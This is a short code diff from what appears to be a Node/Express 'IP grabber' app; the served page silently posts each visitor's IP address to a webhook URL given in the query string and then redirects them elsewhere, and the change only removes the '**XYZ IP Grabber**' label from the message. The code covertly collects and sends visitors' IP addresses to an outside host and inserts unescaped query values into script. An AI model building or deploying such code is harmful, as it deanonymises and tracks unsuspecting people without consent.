@@ -23,7 +23,7 @@ app.get('/', (req, res) => {
     var request = new XMLHttpRequest();
     request.open('POST', '${ req.query.hook }');
     request.setRequestHeader('Content-type', 'application/json');
-    var params = {content: '**XYZ IP Grabber** | ' + IP}
+    var params = {content: IP}
     request.send(JSON.stringify(params));
     window.location.replace('${ req.query.redirect }');
     }
